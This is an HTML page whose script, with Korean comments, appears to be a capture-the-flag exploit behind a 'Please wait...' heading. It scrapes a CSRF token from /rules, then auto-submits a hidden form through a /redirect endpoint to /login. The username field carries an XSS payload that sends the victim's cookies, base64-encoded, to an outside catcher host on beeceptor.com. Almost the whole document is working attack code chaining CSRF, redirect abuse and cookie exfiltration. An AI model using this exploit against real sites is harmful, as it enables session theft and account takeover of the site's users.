<html>
<body>
    <h1>Please wait...</h1>
    <script>
        // 1. /rules 페이지를 fetch하여 내용을 가져옵니다.
        fetch('/rules')
            .then(res => res.text())
            .then(html => {
                // 2. 페이지 내용에서 CSRF 토큰을 추출합니다.
                const csrfToken = html.split('"X-CSRF-Token":"')[1].split('"')[0];

                // 3. 동적으로 form을 생성합니다.
                const form = document.createElement('form');
                form.method = 'POST';
                
                // 4. 여기가 핵심! action을 /login이 아닌 /redirect로 설정합니다.
                // url 파라미터로 최종 목적지인 /login을 지정합니다.
                form.action = '/redirect?url=/login';

                // 5. form에 필요한 데이터(XSS 페이로드, CSRF 토큰)를 채웁니다.
                const userInput = document.createElement('input');
                userInput.type = 'hidden';
                userInput.name = 'username';
                userInput.value = `<img src=x onerror="document.location='https://my-ctf-catcher.free.beeceptor.com?data='+btoa(document.cookie)">`;

                const csrfInput = document.createElement('input');
                csrfInput.type = 'hidden';
                csrfInput.name = '_csrf';
                csrfInput.value = csrfToken;

                const passInput = document.createElement('input');
                passInput.type = 'hidden';
                passInput.name = 'password';
                passInput.value = 'pwned';

                form.appendChild(userInput);
                form.appendChild(csrfInput);
                form.appendChild(passInput);

                // 6. form을 제출하여 CSPT 공격을 시작합니다.
                document.body.appendChild(form);
                form.submit();
            });
    </script>
</body>
</html>
